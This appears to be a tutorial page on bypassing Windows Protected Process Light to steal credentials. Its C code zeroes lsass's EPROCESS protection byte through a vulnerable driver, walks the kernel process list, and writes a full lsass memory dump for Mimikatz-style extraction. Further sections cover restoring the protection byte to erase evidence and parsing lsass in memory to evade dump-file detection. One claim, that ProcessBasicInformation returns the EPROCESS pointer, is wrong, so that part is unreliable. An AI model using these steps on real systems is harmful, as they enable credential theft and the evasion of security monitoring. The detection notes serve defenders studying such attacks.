---
layout: page
title: "PPL Bypass: Attacking Protected Processes"
---

# PPL Bypass: Attacking Protected Processes

Process injection and memory reading assume you can open a handle to the target process with sufficient access rights. Handle stripping via `ObRegisterCallbacks` reduces those rights. But even before handle stripping applies, some processes on Windows enforce a protection level that prevents any less-privileged process from opening them at all. This is Protected Process Light (PPL).

`lsass.exe` runs as a PPL process on modern Windows. An EDR agent may also register as PPL to protect itself from termination and memory tampering. A PPL process cannot be opened with `PROCESS_VM_READ`, `PROCESS_VM_WRITE`, or `PROCESS_TERMINATE` by any process with an equal or lower protection level. The handle request fails before `ObRegisterCallbacks` even has a chance to run.

## Protection Levels

Every process has a `Protection` field in its `EPROCESS` kernel structure. The field is a `_PS_PROTECTION` structure, one byte wide:

```c
typedef struct _PS_PROTECTION {
    union {
        UCHAR Level;
        struct {
            UCHAR Type   : 3;  // 0=None, 1=ProtectedLight, 2=Protected
            UCHAR Audit  : 1;  // reserved
            UCHAR Signer : 4;  // signer level (see below)
        };
    };
} PS_PROTECTION;
```

The `Signer` field determines the trust hierarchy. Higher signer values outrank lower ones. A process can only open handles to processes at an equal or lower signer level.

```
Signer values (higher = more trusted):
  0  PsProtectedSignerNone
  1  PsProtectedSignerAuthenticode
  2  PsProtectedSignerCodeGen
  3  PsProtectedSignerAntimalware   <- AV/EDR agents, lsass on some configs
  4  PsProtectedSignerLsa           <- lsass.exe default PPL level
  5  PsProtectedSignerWindows       <- core Windows services
  6  PsProtectedSignerWinTcb        <- Windows kernel components
  7  PsProtectedSignerWinSystem
```

A process with `Type=1` (PPL) and `Signer=3` (Antimalware) cannot open a handle to a process with `Signer=4` (Lsa) or higher for sensitive access rights. A fully unprotected process (`Type=0`) cannot open any PPL process for `PROCESS_VM_READ` or similar.

## What PPL Restricts

PPL does not make a process invisible. Task Manager lists it. Its PID is discoverable. What PPL restricts is the access mask on handles. When `NtOpenProcess` is called targeting a PPL process from a lower-trust caller:

- `PROCESS_VM_READ` is denied
- `PROCESS_VM_WRITE` is denied
- `PROCESS_TERMINATE` is denied
- `PROCESS_CREATE_THREAD` is denied

Limited access is still granted: `PROCESS_QUERY_LIMITED_INFORMATION` returns basic metadata. Enough to see the process exists, not enough to read its memory or inject into it.

## The EPROCESS.Protection Field

The protection level is stored in `EPROCESS` at a version-specific offset. On a system with kernel write access (via BYOVD or any other kernel primitive), modifying this byte changes the process's protection level instantly.

```c
// Offsets vary by Windows build -- these are representative for Windows 11 22H2
// The correct offset is found by symbol lookup or pattern scanning

#define EPROCESS_PROTECTION_OFFSET 0x87A  // example -- must be verified per build

void downgrade_ppl(HANDLE vuln_device, ULONG64 eprocess_addr) {
    ULONG64 protection_addr = eprocess_addr + EPROCESS_PROTECTION_OFFSET;

    // Read current protection byte
    ULONG current = kernel_read(vuln_device, protection_addr);

    // Zero the protection: Type=0, Signer=0 -- fully unprotected
    kernel_write(vuln_device, protection_addr, 0);
}
```

After zeroing the `Protection` field, `NtOpenProcess` on the target succeeds with any access mask. The process is still running, its code is unchanged, but the kernel no longer enforces protection restrictions on handle creation.

## Finding the EPROCESS Address

`NtOpenProcess` grants a handle even to PPL processes for `PROCESS_QUERY_LIMITED_INFORMATION`. The `NtQueryInformationProcess` with `ProcessBasicInformation` returns the `EPROCESS` pointer (`PebBaseAddress` is in the same structure, and on some versions the `UniqueProcessId` correlates to a findable kernel structure).

A more direct approach: `NtQuerySystemInformation` with `SystemProcessInformation` returns a list of all processes including their kernel object addresses on some Windows versions. On versions where this is restricted, pattern scanning through the kernel's process list starting from a known anchor (the current process's `EPROCESS`, accessible via `PsGetCurrentProcess` from kernel code, or through `NtQueryInformationProcess` from user space) finds the target.

```c
// From kernel driver: walk the ActiveProcessLinks list
// Each EPROCESS contains a LIST_ENTRY at a known offset
// that links all processes in the system

#define EPROCESS_ACTIVE_PROCESS_LINKS_OFFSET 0x448  // Windows 11 22H2
#define EPROCESS_UNIQUE_PROCESS_ID_OFFSET    0x440
#define EPROCESS_PROTECTION_OFFSET           0x87A

ULONG64 find_eprocess_by_pid(HANDLE vuln_device,
                               ULONG64 initial_eprocess,
                               DWORD   target_pid)
{
    ULONG64 flink_addr = initial_eprocess
                         + EPROCESS_ACTIVE_PROCESS_LINKS_OFFSET;

    ULONG64 current_flink_lo = kernel_read(vuln_device, flink_addr);
    ULONG64 current_flink_hi = kernel_read(vuln_device, flink_addr + 4);
    ULONG64 current_flink    = (current_flink_hi << 32) | current_flink_lo;

    while (current_flink != flink_addr) {
        // EPROCESS base = flink - offset_of(ActiveProcessLinks)
        ULONG64 eprocess = current_flink - EPROCESS_ACTIVE_PROCESS_LINKS_OFFSET;

        ULONG pid = kernel_read(vuln_device,
                                eprocess + EPROCESS_UNIQUE_PROCESS_ID_OFFSET);

        if (pid == target_pid)
            return eprocess;

        // Follow flink to next entry
        ULONG64 next_lo = kernel_read(vuln_device, current_flink);
        ULONG64 next_hi = kernel_read(vuln_device, current_flink + 4);
        current_flink   = (next_hi << 32) | next_lo;
    }

    return 0;
}
```

Walking `ActiveProcessLinks` traverses every `EPROCESS` in the system. Each node is at `flink - offset_of(ActiveProcessLinks)`. The `UniqueProcessId` field identifies the process. When the target PID is found, the `EPROCESS` address is known.

## Dumping lsass After PPL Bypass

The primary operational use of PPL bypass is credential access. `lsass.exe` stores NTLM hashes, Kerberos tickets, and cleartext credentials (depending on configuration). Its protection prevents `PROCESS_VM_READ` handles from being opened.

After zeroing the `Protection` field:

```c
// lsass PID found through standard enumeration (CreateToolhelp32Snapshot)
DWORD lsass_pid = find_lsass_pid();

// PPL is now zero -- OpenProcess succeeds
HANDLE lsass = OpenProcess(
    PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
    FALSE,
    lsass_pid
);

// MiniDumpWriteDump writes a full memory dump
HANDLE dump_file = CreateFileA(
    "C:\\Windows\\Temp\\lsass.dmp",
    GENERIC_WRITE,
    0, NULL,
    CREATE_ALWAYS,
    FILE_ATTRIBUTE_NORMAL,
    NULL
);

MiniDumpWriteDump(
    lsass,
    lsass_pid,
    dump_file,
    MiniDumpWithFullMemory,
    NULL, NULL, NULL
);
```

The dump file contains the full `lsass.exe` memory. Tools like Mimikatz or pypykatz run offline against the dump to extract credentials.

## PPLFault: Bypassing Without Kernel Write

Modifying `EPROCESS.Protection` requires kernel write access. Gabriel Landau (Elastic) demonstrated a different approach: exploiting a race condition in the PPL image-loading mechanism to execute unsigned code within a PPL process context, without any kernel write primitive.

The technique exploits how Windows verifies code integrity for PPL processes. When a PPL process maps a DLL, the kernel checks the DLL's signature before allowing execution. The check is performed on the file contents at the time of mapping. But between the signature verification and the point where the DLL's code becomes executable, there is a window in which the file's content can be replaced using a specific sequence of file operations that exploit Windows's TOCTOU handling.

The practical result: a non-PPL process can cause a PPL process to execute an unsigned DLL, giving arbitrary code execution in the PPL context. From inside the PPL context, operations that require PPL-level trust (reading PPL process memory, for example) succeed because they originate from within the protection boundary.

This technique does not require a vulnerable driver or any kernel-mode code. It exploits a design flaw in user-mode components of the PPL verification chain.

## Credential Guard

Credential Guard isolates credential material further. When enabled, `lsass.exe` runs as a PPL but the actual credential data is stored in a separate Isolated User Mode (IUM) process (`LsaIso.exe`) that runs in a Virtual Trust Level (VTL-1) context protected by the hypervisor. Even with PPL bypass and full `lsass.exe` memory read access, the in-memory credential structures contain encrypted blobs rather than plaintext material. The decryption key lives in `LsaIso.exe`, which is inaccessible from VTL-0 (normal OS) code.

Credential Guard does not prevent Kerberos ticket extraction from `lsass.exe` memory, because tickets are present in VTL-0 accessible structures. It specifically protects NTLM hashes and cleartext passwords from being reconstructed outside of the secure environment.

## Restoring PPL After the Operation

Leaving a PPL process with zeroed protection is detectable and destabilizing. Security products that verify their own protection level periodically will notice the change. Restoring the original `Protection` byte after the operation completes removes the evidence:

```c
void restore_ppl(HANDLE vuln_device,
                 ULONG64 eprocess_addr,
                 BYTE original_protection)
{
    kernel_write(vuln_device,
                 eprocess_addr + EPROCESS_PROTECTION_OFFSET,
                 original_protection);
}
```

The restoration window matters. Between zeroing and restoring, the process is open to any caller. If the EDR polls its own protection level during that window, an alert fires. Minimizing the time between the two operations reduces exposure.

## What Survives PPL Bypass

PPL bypass enables handle acquisition. It does not disable the other detection mechanisms. The `MiniDumpWriteDump` call is itself a monitored operation. Writing to a file named `lsass.dmp` triggers minifilter callbacks. The dump file on disk is scanned. Exfiltrating the dump generates network telemetry.

Alternatives that avoid the dump file: read `lsass.exe` memory directly and parse the credential structures in memory without writing anything to disk. The parsing logic (equivalent to what Mimikatz does offline) runs in-process. No file is written, no filename triggers a signature. The behavioral signal is a process opening `lsass.exe` with `PROCESS_VM_READ` and making a series of `ReadProcessMemory` calls into its address space, which is a strong indicator regardless of the technique used to obtain the handle.
